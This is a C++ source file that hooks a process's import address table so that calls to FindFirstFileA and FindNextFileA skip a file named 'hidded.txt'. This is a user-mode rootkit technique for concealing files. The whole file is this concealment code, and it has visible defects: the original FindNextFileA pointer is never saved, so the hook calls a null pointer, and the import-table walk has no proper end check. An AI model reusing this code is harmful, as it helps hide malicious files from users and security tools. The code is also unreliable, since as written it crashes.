#include "Hooking.h"
#include <stdio.h>
#include "pch.h"

FindFirstFileA_t OriginalFFF = NULL;
FindNextFileA_t OriginalFNF = NULL;
char FileName[] = "hidded.txt";

extern "C" {
	HANDLE WINAPI HookedFFF(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindData) {
		HANDLE hFind = OriginalFFF(lpFileName, lpFindData);

		if (hFind != INVALID_HANDLE_VALUE && strcmp(lpFindData->cFileName, FileName) == 0) FindNextFileA(hFind, lpFindData);

		return hFind;
	}

	BOOL WINAPI HookedFNF(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFileData) {
		BOOL result;
		
		while ((result = OriginalFNF(hFindFile, lpFileData)) == TRUE) {
			if (strcmp(lpFileData->cFileName, FileName) != 0) return result;
		}

		return result;
	}

	void InstallIATHOOK() {
		HMODULE hModule = GetModuleHandle(NULL);

		PIMAGE_DOS_HEADER pDOSheader = (PIMAGE_DOS_HEADER)hModule;
		PIMAGE_NT_HEADERS pNTheader = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDOSheader->e_lfanew);
		
		PIMAGE_IMPORT_DESCRIPTOR pImageimportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + pNTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

		while (pImageimportDesc) {
			LPCSTR DllName = (LPCSTR)((BYTE*)hModule + pImageimportDesc->Name);
			
			if (strcmp(DllName, "KERNEL32.dll") == 0) {
				PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImageimportDesc->FirstThunk);

				while (pThunk->u1.Function) {
					PROC* ppFunc = (PROC*)&pThunk->u1.Function;
					DWORD oldProtect;

					if (*ppFunc == (PROC)GetProcAddress(GetModuleHandle(L"KERNEL32.dll"), "FindFirstFileA")) {
						VirtualProtect(ppFunc, sizeof(PROC), PAGE_EXECUTE_READWRITE, &oldProtect);
						OriginalFFF = (FindFirstFileA_t)*ppFunc;
						*ppFunc = (PROC)HookedFFF;
						VirtualProtect(ppFunc, sizeof(PROC), oldProtect, &oldProtect);
					} else if (*ppFunc == (PROC)GetProcAddress(GetModuleHandle(L"KERNEL32.dll"), "FindNextFileA")) {
						VirtualProtect(ppFunc, sizeof(PROC), PAGE_EXECUTE_READWRITE, &oldProtect);
						*ppFunc = (PROC)HookedFNF;
						VirtualProtect(ppFunc, sizeof(PROC), oldProtect, &oldProtect);
						break;
					}
					pThunk++;
				}
				break;
			}
			pImageimportDesc++;
		}
	}
}